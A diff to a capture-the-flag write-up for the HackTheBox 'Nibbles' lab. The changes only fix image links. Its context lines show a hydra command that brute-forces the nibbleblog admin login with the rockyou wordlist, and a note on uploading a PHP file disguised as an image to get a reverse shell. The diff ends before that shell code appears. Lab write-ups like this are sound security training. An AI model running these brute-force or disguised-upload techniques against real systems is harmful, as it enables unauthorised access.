@@ -25,7 +25,7 @@ PWNED TIME: 12th April 2020
 
 Use Burpsuite, locate the login portal and its url, then use burpsuite repeater to repeat the login access.
 
-![Nibbles%205f92a871a4f941df83cdeb203e947b41/Untitled.png](./Nibbles%205f92a871a4f941df83cdeb203e947b41/Untitled.png)
+![Nibbles5f92a871a4f941df83cdeb203e947b41/Untitled.png](/Nibbles5f92a871a4f941df83cdeb203e947b41/Untitled.png)
 
 ```bash
 hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.75 http-post-form "/nibbleblog/admin.php:username=^USER^&password=^PASS^:Incorrect username"
@@ -215,7 +215,7 @@ prepare the php file camouflaged as image file, and prepare the listen nc at att
 
 How to send HTTP GET with cookie in Burpsuite ? 
 
-![Nibbles%205f92a871a4f941df83cdeb203e947b41/Untitled%201.png](Nibbles%205f92a871a4f941df83cdeb203e947b41/Untitled%201.png)
+![Nibbles5f92a871a4f941df83cdeb203e947b41/Untitled%201.png](Nibbles5f92a871a4f941df83cdeb203e947b41/Untitled%201.png)
 
 Got the reverse shell with below code
 
